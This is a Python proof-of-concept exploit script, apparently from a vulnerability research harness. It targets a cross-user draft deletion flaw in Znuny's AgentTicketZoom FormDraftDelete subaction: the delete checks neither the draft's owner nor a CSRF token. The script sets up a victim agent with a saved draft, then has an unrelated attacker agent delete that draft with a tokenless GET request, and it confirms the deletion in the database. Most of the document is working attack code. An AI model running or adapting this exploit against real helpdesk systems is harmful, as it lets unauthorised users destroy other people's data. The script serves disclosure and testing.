#!/usr/bin/env python3
r"""
VULN-016 — AgentTicketZoom;FormDraftDelete cross-user draft deletion (no owner check, no token)
================================================================================================
Vulnerable code : targets/Znuny/Kernel/Modules/AgentTicketZoom.pm:322-327 (no ChallengeTokenCheck)
                  targets/Znuny/Kernel/System/FormDraft.pm FormDraftDelete -> DELETE ... WHERE id = ?
Vulnerability   : CWE-639 IDOR + CWE-352 CSRF (no token)

Flaw
----
The FormDraftDelete subaction deletes the attacker-supplied `FormDraftID`, gated only by `ro`
TicketPermission on the *unrelated* URL `TicketID`. `FormDraftDelete`/`FormDraftGet` scope on
`id` alone (the UserID is never in the WHERE), so any agent with `ro` on any one ticket deletes
any other user's saved draft. No ChallengeToken in the module either → also CSRF.

Exploit: victim agent has a saved draft (id V). Attacker (ro on an unrelated ticket) calls
FormDraftDelete with FormDraftID=V → the victim's draft row disappears.
"""
import os, sys
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import _common as C

HERE = os.path.dirname(os.path.abspath(__file__))

def main():
    C.banner("VULN-016", "AgentTicketZoom;FormDraftDelete cross-user draft deletion",
             ["FormDraftDelete scopes on id only (no owner check); AgentTicketZoom has no ChallengeTokenCheck"])
    sfx = C.rid()
    # victim agent + a ticket + a saved form draft owned by the victim
    vu, vp = C.create_agent(login=f"vic016_{sfx}", groups=["users"])
    vuid = C.agent_uid(vu)
    vtid, _ = C.create_ticket(f"victim draft ticket {sfx}", "Raw", customer_id="v", customer_user="v")
    C.log("SETUP", f"victim agent {vu} (uid {vuid}); ticket {vtid}")
    dtitle = f"VictimDraft_{sfx}"
    perl = ("my $F=$Kernel::OM->Get('Kernel::System::FormDraft');"
            "$F->FormDraftAdd(FormData=>{Subject=>'victims private draft %s'},"
            "Title=>'%s',ObjectType=>'Ticket',ObjectID=>%d,Action=>'AgentTicketNote',UserID=>%d);"
            "print 'ADDED';" % (sfx, dtitle, vtid, vuid))
    rc, out, err = C.perl_eval(perl)
    rows = C.db(f"SELECT id FROM form_draft WHERE title='{dtitle}'")
    if "ADDED" not in out or not rows:
        C.failed(f"could not create victim draft: out={out} err={err} rows={rows}")
    draft_id = int(rows[0][0])
    C.log("SETUP", f"victim saved FormDraft id={draft_id}")

    # attacker: an unrelated agent with ro on a DIFFERENT ticket
    au, ap = C.create_agent(login=f"att016_{sfx}", groups=["users"])
    atid, _ = C.create_ticket(f"attacker ticket {sfx}", "Raw", customer_id="a", customer_user="a")
    a = C.agent_client(au, ap)
    C.log("PROOF", f"attacker {au} owns draft {draft_id}? {C.db('SELECT create_by FROM form_draft WHERE id=%d' % draft_id)} (victim uid={vuid})")

    before = C.db(f"SELECT id,title FROM form_draft WHERE id={draft_id}")
    C.log("PROOF", f"victim draft before attack: {before}")
    # tokenless GET: delete victim's draft, gated only by ro on the attacker's own ticket
    C.log("STEP", f"attacker GET FormDraftDelete FormDraftID={draft_id} (TicketID={atid} = attacker's own, ro)")
    r = a.get({"Action": "AgentTicketZoom", "Subaction": "FormDraftDelete",
               "TicketID": atid, "FormDraftID": draft_id})
    C.log("INFO", f"HTTP {r.status_code} body head: {r.text[:80]!r}")
    after = C.db(f"SELECT id,title FROM form_draft WHERE id={draft_id}")
    C.log("PROOF", f"victim draft after attack: {after}")

    open(os.path.join(HERE, "request.http"), "w").write(
        "GET /znuny/index.pl?Action=AgentTicketZoom;Subaction=FormDraftDelete;"
        f"TicketID={atid};FormDraftID={draft_id} HTTP/1.1\r\nCookie: OTRSAgentInterface=<attacker>\r\n"
        "(no ChallengeToken)\r\n")
    open(os.path.join(HERE, "response.txt"), "w").write(
        f"draft before={before} after={after}\n")

    if before and not after:
        C.confirmed(f"attacker {au} deleted victim {vu}'s saved FormDraft id={draft_id} via a "
                    "tokenless GET, authorised only by ro on the attacker's own unrelated ticket "
                    "— cross-user draft deletion (IDOR) with no CSRF token.")
    else:
        C.failed(f"victim draft not deleted: before={before} after={after}")

if __name__ == "__main__":
    main()
